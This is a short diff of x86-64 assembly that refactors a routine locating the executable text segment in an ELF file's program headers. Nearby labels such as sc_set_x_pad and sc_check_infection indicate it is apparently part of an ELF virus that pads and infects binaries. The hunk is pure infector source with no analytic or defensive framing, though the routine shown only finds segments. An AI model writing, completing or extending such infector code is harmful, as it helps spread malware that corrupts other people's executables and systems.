@@ -241,41 +241,31 @@ sc_set_x_pad:
 				ret
 sc_find_txt_seg:
 				mov				rdi,					qword[sc_glob]
-				mov				r9,						qword[rdi+0x48];*hdrs.elf
+				mov				r8,						qword[rdi+0x48]; *hdrs.elf
 
-				xor				rcx,					rcx
+				mov				rcx,					1
 				mov				rsi,					qword[rdi+0xc60]
 				add				rsi,					qword[r8+0x20]
- .loop:
- 				cmp				qword[rdi+0x50],		0
-				jne				.check_error
-
-				cmp				rcx,					qword[r9+0x38]
-				je				.check_error
+.loop:
+				cmp				rcx,					qword[r8+0x38]
+				je				.error
 
 				cmp				dword[rsi],				1
-				jne				.end_loop
+				jne				.inc
 
 				mov				edx,					dword[rsi+0x4]
 				and				edx,					0x1
-				cmp				edx,					1
-				jb				.end_loop
+				cmp				edx,					0
+				je				.inc
 
 				mov				qword[rdi+0x50],		rsi
-  .end_loop:
+ 				xor				rax,					rax
+				ret
+.inc:
 				inc				rcx
 				add				rsi,					56
 				jmp				.loop
- .check_error:
- 				cmp				qword[rdi+0x50],		0
-				je				.error
-
-				cmp				rcx,					qword[r9+0x38]
-				je				.error
- .end:
- 				xor				rax,					rax
-				ret
- .error:
+.error:
  				mov				rax,					-1
 				ret
 sc_check_infection:
